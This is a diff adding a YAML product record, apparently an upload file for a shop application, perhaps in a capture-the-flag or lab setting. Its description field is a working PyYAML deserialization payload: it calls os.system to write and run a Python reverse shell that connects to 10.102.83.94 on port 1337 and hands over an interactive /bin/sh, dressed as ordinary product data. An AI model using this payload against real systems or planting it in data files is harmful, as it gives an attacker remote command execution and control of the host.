@@ -1,0 +1,7 @@
+name: Reverse-Shell
+category: 1
+description: !!python/object/apply:os.system ["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.102.83.94\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > exploit.py && python exploit.py"]
+price: 120
+available: 1
+stock: 10
+image: "djangocon.png"
